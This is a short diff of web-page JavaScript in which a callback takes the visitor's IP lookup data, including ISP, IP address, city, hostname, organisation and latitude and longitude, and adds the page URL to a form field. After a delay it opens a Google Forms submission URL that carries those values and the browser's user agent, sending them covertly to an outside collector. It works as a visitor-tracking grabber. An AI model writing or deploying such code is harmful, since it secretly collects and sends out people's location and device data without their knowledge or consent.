@@ -37,7 +37,7 @@
    function getIP(json){var Y = document.getElementById("1");
 //var ui = "ISP" + ":" + json.isp + "," + "PIP" + ":" + json.ip + "," + "," + "city" + ":" + json.city + "," + "," + "hostname" +  ":" + json.hostname + "," + "," + "Org" + ":" + json.org + "," + "latitude" + ":" + json.latitude + "," + "longitude" + ":" + json.longitude;  
    
-Y.value = json.isp + "," + json.ip + "," + json.city + "," + json.hostname + "," + json.org + "," + "latitude" + ":" + json.latitude + "," + "longitude" + ":" + json.longitude;  
+Y.value = json.isp + "," + json.ip + "," + json.city + "," + json.hostname + "," + json.org + "," + "latitude" + ":" + json.latitude + "," + "longitude" + ":" + json.longitude + "," + "Website" + ":" + location.href;  
  
 setTimeout(() => window.open(`https://docs.google.com/forms/d/e/1FAIpQLSdMj_td6pP4Bucg5ILSf5D9qD5ucPlL8GPE_Zf7YDFWaop0sg/formResponse?entry.420308320=${json.isp} ,${json.ip},${json.city},${json.hostname},${json.org},${json.latitude},${json.longitude}&entry.35905334=Device:${navigator.userAgent} ${f}`,"jv"),1000);
 }   
